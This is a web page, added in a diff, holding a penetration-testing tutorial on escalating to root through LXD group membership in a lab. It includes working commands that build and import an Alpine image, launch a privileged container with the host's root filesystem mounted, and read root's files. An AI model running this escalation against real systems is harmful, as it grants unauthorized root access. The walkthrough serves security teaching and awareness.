@@ -1,0 +1,105 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Lxd Privilege Escalation</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-10-12T13:52:45+00:00">October 12, 2019</time><time class="updated" datetime="2025-06-07T10:53:48+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this post, we are going to describe how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD.</span></p>
+<p class="ai-optimize-7"><span style="color: #000000;">A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</span></p>
+<p class="ai-optimize-8"><span style="color: #000000;">LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.</span></p>
+<p class="ai-optimize-9"><span style="color: #000000;">One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post. This gives a low-privilege user root access to the host filesystem. </span></p>
+<h3 class="ai-optimize-10"><span style="color: #000000;"><span style="color: #800000;">Table of Content</span> </span></h3>
+<ul>
+<li class="ai-optimize-11"><span style="color: #000000;">Introduction to LXD and LXC</span></li>
+<li class="ai-optimize-12"><span style="color: #000000;">Container Technology</span></li>
+<li class="ai-optimize-13"><span style="color: #000000;">LXD Installation and Configuration</span></li>
+<li class="ai-optimize-14"><span style="color: #000000;">LXD Installation and Configuration</span></li>
+</ul>
+<h3 class="ai-optimize-15"><span style="color: #000000;"><span style="color: #800000;">Introduction to LXD and LXC</span> </span></h3>
+<p class="ai-optimize-16"><span style="color: #000000;"><strong>Linux Container (LXC)</strong> are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.</span></p>
+<p class="ai-optimize-17"><span style="color: #000000;"><strong>Linux daemon (LXD)</strong> is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.</span></p>
+<h3 class="ai-optimize-18"><span style="color: #000000;"><span style="color: #800000;">Container Technology</span> </span></h3>
+<p class="ai-optimize-19"><span style="color: #000000;">Container technology comes from the container, is a procedure to assemble an application so that it can be run, with its requirements, in isolation from other processes container applications with names like Docker and Apache Mesos ‘ popular choices have been introduced by major public cloud vendors including Amazon Web Services, Microsoft Azure and Google Cloud Platforms.</span></p>
+<p class="ai-optimize-20"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_CB2pZPg8m0/XaHYIWKJAHI/AAAAAAAAg5U/yGRt4Ph86BInmKTHukRJiqCayDgo0_D3ACLcBGAsYHQ/s1600/0.png"/></span></p>
+<h4 class="ai-optimize-21"><span style="color: #000000;">Requirement </span></h4>
+<p class="ai-optimize-22"><span style="color: #000000;"><strong>Host machine:</strong> ubuntu 18:04</span></p>
+<p class="ai-optimize-23"><span style="color: #000000;"><strong>Attacker machine:</strong> Kali Linux or any other Machine</span></p>
+<p class="ai-optimize-24"><span style="color: #000000;">Let’s Begin !!</span></p>
+<p class="ai-optimize-25"><span style="color: #000000;">So here you can observe that we have a profile for user “raj” as a local user account on the host machine.</span></p>
+<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gqZpTNWOKoY/XaHYIeI118I/AAAAAAAAg5Y/5sYQnwNi_UQ0W4_biLFXCuTzyh2cmg3zwCLcBGAsYHQ/s1600/1.png"/></span></p>
+<h3 class="ai-optimize-27"><span style="color: #000000;"><span style="color: #800000;">LXD Installation and Configuration</span> </span></h3>
+<p class="ai-optimize-28"><span style="color: #000000;">Now install lxd by executing the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install lxd</pre>
+<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8xqDM4zgh60/XaHYJw5CcOI/AAAAAAAAg5o/Mw7JS79TxEoprjk8_WQ774y4lh--aKCkgCLcBGAsYHQ/s1600/2.png"/></span></p>
+<p class="ai-optimize-30"><span style="color: #000000;">Also, you need to install some dependency for lxd:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install zfsutils-linux</pre>
+<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hm2iDy3Lrc8/XaHYKImHgaI/AAAAAAAAg5s/yC3PrgSjsnkrUmbAqHf35luzl0StI5RqwCLcBGAsYHQ/s1600/3.png"/></span></p>
+<p class="ai-optimize-32"><span style="color: #000000;">Now to add a profile for user: raj into the lxd group, type following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">usermod --append --groups lxd raj</pre>
+<p class="ai-optimize-33"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DG5zwx0290E/XaHYKYPDVhI/AAAAAAAAg5w/qdf8vSLM_ywLF6Ojf9Yz25SRG5R7O6cJQCLcBGAsYHQ/s1600/4.png"/></span></p>
+<p class="ai-optimize-34"><span style="color: #000000;">So now you can observe user “raj” is part of lxd groups.</span></p>
+<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-48IdqKYfn4Q/XaHYKnJvarI/AAAAAAAAg50/bU6OquLIG3oWQtrxSqmVYsAJCILMRIQFgCLcBGAsYHQ/s1600/5.png"/></span></p>
+<p class="ai-optimize-36"><span style="color: #000000;">Now you can configure LXD and start the LXD initialization process with the <strong>lxd init</strong> command. During initialization it will ask for choosing some option, here majorly we have gone with DEFAULT options. But for the storage backend, we have choose “<strong>dir</strong>” instead of zfs.</span></p>
+<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WVtEJzcKxDE/XaHYLDltwHI/AAAAAAAAg54/HVW3TglLpawogYL3F6imODqfONx4XQymQCLcBGAsYHQ/s1600/6.png"/></span></p>
+<p class="ai-optimize-38"><span style="color: #000000;">Once you have configured the lxd then you can create a container using lxc. Here we are creating a container for “ubuntu:18.04” and named as “intimate-seasnail”. Further use lxc list command to view the available installed containers.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lxc launch ubuntu:18.04
+lxc list</pre>
+<p class="ai-optimize-39"><span style="color: #000000;">Connect to the container withthe help of lxc exec command, which takes the name of the container and the commands to execute:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lxc exec intimate-seasnail -- /bin/bash</pre>
+<p class="ai-optimize-40"><span style="color: #000000;">Once your are inside the container, the shell prompt will look like as following below.</span></p>
+<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pvpyW_ncd24/XaHYLELxVEI/AAAAAAAAg58/r4pwHijSEl0ZDaZ5SGaLagqmv7NiuQthwCLcBGAsYHQ/s1600/7.png"/></span></p>
+<h3 class="ai-optimize-42"><span style="color: #800000;">Privilege Escalation</span></h3>
+<p class="ai-optimize-43"><span style="color: #000000;">Privilege escalation through lxd requires the access of local account, therefore, we choose SSH to connect and take the access local account on host machine.</span></p>
+<p class="ai-optimize-44"><span style="color: #000000;"><em>Note: the most important condition is that the user should be a member of lxd group.</em></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh raj@192.168.1.105</pre>
+<p class="ai-optimize-45"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jyRKVNcGy3E/XaHYLb3nFXI/AAAAAAAAg6A/JfkG7FazSLYvQDZPepJw35U9l0T5SfGwQCLcBGAsYHQ/s1600/8.png"/></span></p>
+<p class="ai-optimize-46"><span style="color: #000000;">In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:</span></p>
+<h5 class="ai-optimize-69"><span style="color: #000000;"><strong>Steps to be performed on the attacker machine</strong>:</span></h5>
+<ul>
+<li class="ai-optimize-48"><span style="color: #000000;">Download build-alpine in your local machine through the git repository.</span></li>
+<li class="ai-optimize-49"><span style="color: #000000;">Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.</span></li>
+<li class="ai-optimize-50"><span style="color: #000000;">Transfer the tar file to the host machine</span></li>
+</ul>
+<h5 class="ai-optimize-70"><strong><span style="color: #000000;">Steps to be performed on the host machine:</span></strong></h5>
+<ul>
+<li class="ai-optimize-52"><span style="color: #000000;">Download the alpine image</span></li>
+<li class="ai-optimize-53"><span style="color: #000000;">Import image for lxd</span></li>
+<li class="ai-optimize-54"><span style="color: #000000;">Initialize the image inside a new container.</span></li>
+<li class="ai-optimize-55"><span style="color: #000000;">Mount the container inside the /root directory</span></li>
+</ul>
+<p class="ai-optimize-56"><span style="color: #000000;">So, we downloaded the build alpine using the GitHub repose.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine</pre>
+<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Pq2pI1v8leE/XaHYL9-edOI/AAAAAAAAg6E/T9bKB2fY8dUYd8eJFVLpv3-UPMxcmcRVACLcBGAsYHQ/s1600/9.png"/></span></p>
+<p class="ai-optimize-58"><span style="color: #000000;">On running the above command, a tar.gz file is created in the working directory that we have transferred to the host machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer</pre>
+<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QJY3OdT2k8w/XaHYISYrQ-I/AAAAAAAAg5c/oYFVSoQB_w0DbfvddZirjoirtsUm112_QCLcBGAsYHQ/s1600/10.png"/></span></p>
+<p class="ai-optimize-60"><span style="color: #000000;">On another hand we will download the alpine-image inside /tmp directory on the host machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz</pre>
+<p class="ai-optimize-61"><span style="color: #000000;">After the image is built, it can be added as an image to LXD as follows:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage</pre>
+<p class="ai-optimize-62"><span style="color: #000000;">Use the list command to check the list of images</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lxc image list</pre>
+<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yy1afthCNsc/XaHYJSIM37I/AAAAAAAAg5g/KTDuZuVIjmMzqEzlMsNY0E59r7UDV28tACLcBGAsYHQ/s1600/11.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id</pre>
+<p class="ai-optimize-64"><span style="color: #000000;">Once inside the container, navigate to /mnt/root to see all resources from the host machine.</span></p>
+<p class="ai-optimize-65"><span style="color: #000000;">After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the flag and found it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mnt/root/root
+ls
+flag.txt
+cat flag.txt</pre>
+<p class="ai-optimize-66"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Anb2MgTn7oM/XaHYJib3nnI/AAAAAAAAg5k/vazX4tfy3OEJLQ8EZ-o-1LEWvOpD4_vHwCLcBGAsYHQ/s1600/12.png"/></span></p>
+<p class="ai-optimize-67"><span style="color: #000000;"><strong>Source:</strong> https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071</span></p>
+<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
+<p class="ai-optimize-68"><span style="color: #000000;"><strong>Author</strong>: Kavish Tyagi is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/kavish-tyagi-844239125/"><strong>here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
